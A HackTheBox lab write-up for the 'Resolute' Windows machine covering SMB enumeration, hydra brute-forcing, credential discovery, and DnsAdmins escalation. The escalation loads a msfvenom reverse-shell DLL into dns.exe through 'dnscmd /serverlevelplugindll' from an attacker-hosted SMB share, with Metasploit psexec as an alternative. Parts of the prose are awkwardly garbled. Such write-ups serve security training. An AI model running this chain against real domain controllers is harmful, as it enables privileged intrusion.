---
layout: single
title: Abusing DNS Admin Membership by DLL Injection in "dns.exe" for PrivEsc in Active Directory
excerpt: "Resolute was a medium level Windows computer that included a list of users and login discoveries for the SMB system. This password has been pulsed into the SMB login via hydra to the usernames identified. The listing of the privilege escalation led us to another member of the DnsAdmins group. Then, by violating his admin's right to charge the DLL injection to obtain the Admin shell."
date: 2020-05-31
classes: wide
header:
  teaser: /asset/htbwriteup/windows/resolute/intro.PNG
  teaser_home_page: true
  icon: /assets/hackthebox.webp
categories:
  - hackthebox
permalink: /htb/htbResolute
tags: [dll injection, dnscmd.exe, smbserver.py]

---

# HTB - Resolute

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/intro.PNG)

Resolute was a medium level Windows computer that included a list of users and login discoveries for the SMB system. This password has been pulsed into the SMB login via hydra to the usernames identified. The listing of the privilege escalation led us to another member of the DnsAdmins group. Then, by violating his admin's right to charge the DLL injection to obtain the Admin shell.

---
## Recon

- Running nmap scan give us the following information as below.
    
![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/1.png)

- As windows machine, the interesting part of course the SMB services, let's digging in via enum4linux.
- Don't forget to list all the potential accounts in the recon part. It's helping us to move further you know...
- Here, we have hint on `marko` account. See the description there. `Password set to Welcome123!`

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/2.png)

- Trying to log into `marko` account doesn't work. The credential may be wrong.

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/3.png)

- We have the list of usernames right? Let's try brute-force the smb login with `hydra`.
- Yayy, we have the right credential for `melanie` account.

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/4.png)

---
## Exploit

- Nmap scan showed that port 5985 is open. It's the default port for WinRM so catch the user flag by logging in via `evil-winrm` to melanie account.

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/5.png)

- After enumerating the host, we don't meet any hint. Maybe by viewing hidden files give us hint? Let's `dir-Force` and enum for hidden file of `PSTranscripts`.

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/6.png)

- In the `PSTranscripts` folder, we have a text file with Resolute name on it. Open the text file, give us hint of `Powershell` script with a potential credential of `ryan` account.

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/7.png)

- Then, moving into `ryan` account and see what we can do there.

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/8.png)

---
## Privilege escalation

### First method:

- On `ryan` desktop, there is a `note.txt` as below. What does that mean??

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/9.png)

- Enum for the groups information reveal us that ryan has `DnsAdmins` privilege. 
- If the account has `DNSAdmins` in it’s group memberships, then the user belongs to the group and we can abuse his membership to escalate to Administrator rights.

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/11.png)

- Based on this [article](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2), we are launching an arbitrary DLL of SYSTEM authority on a DNS server. i.e., we must create a DLL that contains the reverse tcp code and implant it into the `dns.exe` process on the victim's DNS server (DC).
- Building our DLL `shell_reverse_tcp` payload with `msfvenom` and output to `privesc.dll`.

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/12.png)

### Impacket’s smb server to the rescue:

- Hosting our payload with `smbserver.py`.
- We chose this as, in most cases, Windows allows UNC paths and samba shares by default. Also, there are times when the victim's AV or Defender can delete the payload if it's uploaded, so we'll stick to the smb server for this one. Nonetheless, working with smb can be difficult on * nix, but thankfully, we have scripts that can make the task a lot simpler. We must use the Impacket smb server to host our payload.

sudo python smbserver.py <**shareName**> <**path/of/share**> eg `sudo smbserver.py share ./`

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/13.png)

### Injecting the DLL in dnscmd.exe into PS:

- `dnscmd.exe < FQDN of DC> /config /serverlevelplugindll \\UNC_path`

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/14.png)

### Listening for connection and restarting dns if necessary:

- Stop and restart the DNS service as below... 

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/15.png)

- Listen for the connection and ... we have Administrator privilege.

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/16(root).png)

### Second method:

- Using `windows/smb/psexec_psh` module straight into Admin shell.

![](https://raw.githubusercontent.com/faisalfs10x/faisalfs10x.github.io/master/asset/htbwriteup/windows/resolute/10(root).png)

Thanks...
